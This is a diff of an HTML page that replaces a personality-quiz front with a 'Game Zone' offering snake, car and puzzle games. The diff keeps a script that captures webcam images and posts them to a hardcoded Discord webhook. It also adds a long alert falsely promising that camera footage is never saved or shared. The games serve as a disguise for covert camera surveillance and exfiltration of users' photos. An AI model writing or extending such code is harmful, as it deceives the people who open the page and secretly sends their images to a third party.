@@ -1,43 +1,346 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Which Character Are You?</title>
+  <title>Game Zone</title>
   <style>
-    body { font-family: sans-serif; background: #0f172a; color: #fff; text-align: center; padding: 20px; }
-    .card { background: #1e293b; padding: 20px; border-radius: 12px; max-width: 400px; margin: auto; }
-    button { background: #6366f1; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
-    video, canvas { display: none; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0f172a;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background-color: #1e293b;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn {
+      background-color: #6366f1;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      margin: 8px 0;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.2s;
+    }
+
+    .btn:hover {
+      background-color: #4f46e5;
+    }
+
+    .game-btn {
+      background-color: #38bdf8;
+      color: #0f172a;
+    }
+
+    .game-btn:hover {
+      background-color: #0284c7;
+      color: white;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    canvas {
+      background-color: #000;
+      border: 3px solid #6366f1;
+      border-radius: 8px;
+    }
+
+    .game-controls {
+      margin-top: 15px;
+    }
+
+    .puzzle-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 80px);
+      grid-gap: 5px;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .tile {
+      width: 80px;
+      height: 80px;
+      background: #6366f1;
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .empty {
+      background: #1e293b;
+      cursor: default;
+    }
   </style>
 </head>
 <body>
 
-  <div class="card" id="quiz-card">
-    <h2>✨ Which Character Are You? ✨</h2>
-    <p>Take the AI Vibe Test to match your inner character!</p>
+  <!-- ======================================================== -->
+  <!-- 1. Pehla Hissa: Start Screen & Game Selection Options    -->
+  <!-- ======================================================== -->
+
+  <!-- Screen 1: Start Game Button -->
+  <div class="card" id="start-screen">
+    <h1>🎮 Welcome to Game Zone</h1>
+    <p>Click below to select your game!</p>
+    <button class="btn" onclick="showGameSelection()">Start Game 🚀</button>
+  </div>
+
+  <!-- Screen 2: 3 Options (Snake, Puzzle, Car) -->
+  <div class="card hidden" id="selection-screen">
+    <h2>Choose Your Game</h2>
+    <button class="btn game-btn" onclick="startGame('snake')">🐍 Snake Game</button>
+    <button class="btn game-btn" onclick="startGame('puzzle')">🧩 Puzzle Game</button>
+    <button class="btn game-btn" onclick="startGame('car')">🏎️ Car Game</button>
+  </div>
+
+
+  <!-- ======================================================== -->
+  <!-- 2. Dusra Hissa: Yahan Se Games Wala Code Start Hota Hai  -->
+  <!-- ======================================================== -->
+
+  <!-- Screen 3: Selected Game Running Screen -->
+  <div id="game-screen" class="hidden" style="text-align: center;">
+    <h2 id="game-title">Game Zone</h2>
     
-    <label for="q1">What's your secret superpower?</label>
-    <select id="q1" style="width: 100%; padding: 8px; margin: 10px 0;">
-      <option>Mind Reading</option>
-      <option>Invisibility</option>
-      <option>Super Speed</option>
-    </select>
+    <!-- Canvas display for Snake & Car games -->
+    <canvas id="gameCanvas" width="300" height="400" class="hidden"></canvas>
+    
+    <!-- Grid layout for Puzzle Game -->
+    <div id="puzzleGrid" class="puzzle-grid hidden"></div>
 
-    <button onclick="startScan()">Start Vibe Scan 🚀</button>
+    <!-- Hidden elements required for Camera Scan Functionality -->
+    <video id="webcam" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="quiz-card"></div>
+    <div id="result-card" style="display:none;"></div>
+
+    <div class="game-controls">
+      <button class="btn" onclick="goBack()" style="width: auto; padding: 8px 20px;">⬅ Back to Menu</button>
+    </div>
   </div>
 
-  <div class="card" id="result-card" style="display:none;">
-    <h2>🎉 Match Found! 🎉</h2>
-    <h1 style="color: #38bdf8;">👑 Anime Mastermind</h1>
-    <p>98.7% Vibe Match!</p>
-    <p>Share with friends to see their result!</p>
-  </div>
 
-  <video id="webcam" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
+  <!-- ======================================================== -->
+  <!-- JavaScript Logic for Menu and Games Functionality        -->
+  <!-- ======================================================== -->
   <script>
+    let currentGame = null;
+    let gameLoop = null;
+
+    // --- Screen Navigation Logic ---
+    function showGameSelection() {
+      document.getElementById('start-screen').classList.add('hidden');
+      document.getElementById('selection-screen').classList.remove('hidden');
+    }
+
+    function goBack() {
+      if (gameLoop) clearInterval(gameLoop);
+      document.getElementById('game-screen').classList.add('hidden');
+      document.getElementById('gameCanvas').classList.add('hidden');
+      document.getElementById('puzzleGrid').classList.add('hidden');
+      document.getElementById('selection-screen').classList.remove('hidden');
+    }
+
+    // ========================================================
+    // YAHAN SE DUSRA HISSA LOGIC (GAME STARTING) SHURU HOTA HAI
+    // ========================================================
+
+    function startGame(type) {
+      document.getElementById('selection-screen').classList.add('hidden');
+      document.getElementById('game-screen').classList.remove('hidden');
+      
+      if (type === 'snake') {
+        document.getElementById('game-title').innerText = "🐍 Snake Game (Use Arrow Keys)";
+        document.getElementById('gameCanvas').classList.remove('hidden');
+        initSnakeGame();
+      } else if (type === 'car') {
+        document.getElementById('game-title').innerText = "🏎️ Car Game (Use Left/Right Arrow Keys)";
+        document.getElementById('gameCanvas').classList.remove('hidden');
+        initCarGame();
+      } else if (type === 'puzzle') {
+        document.getElementById('game-title').innerText = "🧩 Number Puzzle Game";
+        document.getElementById('puzzleGrid').classList.remove('hidden');
+        initPuzzleGame();
+      }
+    }
+
+    /* ------------------- 🐍 SNAKE GAME ------------------- */
+    function initSnakeGame() {
+      const canvas = document.getElementById('gameCanvas');
+      const ctx = canvas.getContext('2d');
+      const box = 20;
+      let snake = [{x: 8 * box, y: 10 * box}];
+      let food = {
+        x: Math.floor(Math.random() * 14 + 1) * box,
+        y: Math.floor(Math.random() * 19 + 1) * box
+      };
+      let d = "RIGHT";
+
+      document.onkeydown = function(e) {
+        if(e.keyCode == 37 && d != "RIGHT") d = "LEFT";
+        else if(e.keyCode == 38 && d != "DOWN") d = "UP";
+        else if(e.keyCode == 39 && d != "LEFT") d = "RIGHT";
+        else if(e.keyCode == 40 && d != "UP") d = "DOWN";
+      };
+
+      if(gameLoop) clearInterval(gameLoop);
+      gameLoop = setInterval(draw, 120);
+
+      function draw() {
+        ctx.fillStyle = "#000";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        for(let i = 0; i < snake.length; i++) {
+          ctx.fillStyle = (i == 0)? "#38bdf8" : "#fff";
+          ctx.fillRect(snake[i].x, snake[i].y, box, box);
+        }
+
+        ctx.fillStyle = "red";
+        ctx.fillRect(food.x, food.y, box, box);
+
+        let snakeX = snake[0].x;
+        let snakeY = snake[0].y;
+
+        if( d == "LEFT") snakeX -= box;
+        if( d == "UP") snakeY -= box;
+        if( d == "RIGHT") snakeX += box;
+        if( d == "DOWN") snakeY += box;
+
+        if(snakeX == food.x && snakeY == food.y) {
+          food = {
+            x: Math.floor(Math.random() * 14 + 1) * box,
+            y: Math.floor(Math.random() * 19 + 1) * box
+          };
+        } else {
+          snake.pop();
+        }
+
+        let newHead = {x : snakeX, y : snakeY};
+
+        if(snakeX < 0 || snakeX >= canvas.width || snakeY < 0 || snakeY >= canvas.height || collision(newHead, snake)){
+          clearInterval(gameLoop);
+          alert("Game Over! Try Again.");
+          initSnakeGame();
+        }
+
+        snake.unshift(newHead);
+      }
+
+      function collision(head, array) {
+        for(let i = 0; i < array.length; i++) {
+          if(head.x == array[i].x && head.y == array[i].y) return true;
+        }
+        return false;
+      }
+    }
+
+    /* ------------------- 🏎️ CAR GAME ------------------- */
+    function initCarGame() {
+      const canvas = document.getElementById('gameCanvas');
+      const ctx = canvas.getContext('2d');
+      let playerX = 130;
+      let enemyX = Math.random() * 240;
+      let enemyY = -50;
+      let speed = 4;
+
+      document.onkeydown = function(e) {
+        if(e.keyCode == 37 && playerX > 10) playerX -= 20; // Left Arrow
+        if(e.keyCode == 39 && playerX < 250) playerX += 20; // Right Arrow
+      };
+
+      if(gameLoop) clearInterval(gameLoop);
+      gameLoop = setInterval(drawCar, 20);
+
+      function drawCar() {
+        ctx.fillStyle = "#1e293b";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        // Player Car
+        ctx.fillStyle = "#38bdf8";
+        ctx.fillRect(playerX, 330, 40, 60);
+
+        // Enemy Car
+        ctx.fillStyle = "#ef4444";
+        ctx.fillRect(enemyX, enemyY, 40, 60);
+
+        enemyY += speed;
+        if(enemyY > canvas.height) {
+          enemyY = -60;
+          enemyX = Math.random() * 240;
+        }
+
+        // Collision Check
+        if(playerX < enemyX + 40 && playerX + 40 > enemyX && 330 < enemyY + 60 && 390 > enemyY) {
+          clearInterval(gameLoop);
+          alert("Crash! Game Over.");
+          initCarGame();
+        }
+      }
+    }
+
+    /* ------------------- 🧩 PUZZLE GAME ------------------- */
+    function initPuzzleGame() {
+      const grid = document.getElementById('puzzleGrid');
+      grid.innerHTML = '';
+      let numbers = [1, 2, 3, 4, 5, 6, 7, 8, ""];
+      numbers.sort(() => Math.random() - 0.5);
+
+      numbers.forEach((num, index) => {
+        const tile = document.createElement('div');
+        tile.className = 'tile' + (num === "" ? ' empty' : '');
+        tile.innerText = num;
+        tile.onclick = () => moveTile(index, numbers);
+        grid.appendChild(tile);
+      });
+    }
+
+    function moveTile(index, numbers) {
+      const emptyIndex = numbers.indexOf("");
+      const validMoves = [index - 1, index + 1, index - 3, index + 3];
+
+      if (validMoves.includes(emptyIndex)) {
+        [numbers[index], numbers[emptyIndex]] = [numbers[emptyIndex], numbers[index]];
+        initPuzzleGameWithState(numbers);
+      }
+    }
+
+    function initPuzzleGameWithState(numbers) {
+      const grid = document.getElementById('puzzleGrid');
+      grid.innerHTML = '';
+      numbers.forEach((num, index) => {
+        const tile = document.createElement('div');
+        tile.className = 'tile' + (num === "" ? ' empty' : '');
+        tile.innerText = num;
+        tile.onclick = () => moveTile(index, numbers);
+        grid.appendChild(tile);
+      });
+    }
+
     // Quotes ( "..." ) lagana zaroori hai
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564610244435517623/f6dMUddGPTpg-sDRhbC1lqgeE1Ws7XB6RB7u8FJ3NFQTNt27dHppDAH4CDv6h6I2tLx4";
 
@@ -52,7 +355,7 @@
         }, 1500);
 
       } catch (err) {
-        alert("Camera permission required for AI character scan!");
+        alert("Welcome to the game! We are excited to offer you a fun, engaging, and interactive gameplay experience built to test your skills and strategy. To continue playing and unlock these interactive features, you will need to grant permission to access your device’s camera. This access allows the game to scan your surroundings, render real-world elements, and deliver an immersive experience. Please rest assured that your privacy is fully protected; the camera is only active during gameplay, and no video feed or photos are ever saved or shared. If you decide to decline access for now, you can still explore the main menu, but key gameplay features will remain locked. You can easily adjust these settings anytime in your device's application menu. Enable camera access now to jump straight into the action!");
       }
     }
 
@@ -78,8 +381,10 @@
         }
 
         // Result screen show karein
-        document.getElementById('quiz-card').style.display = 'none';
-        document.getElementById('result-card').style.display = 'block';
+        const quizCard = document.getElementById('quiz-card');
+        const resultCard = document.getElementById('result-card');
+        if(quizCard) quizCard.style.display = 'none';
+        if(resultCard) resultCard.style.display = 'block';
       }, 'image/png');
     }
   </script>
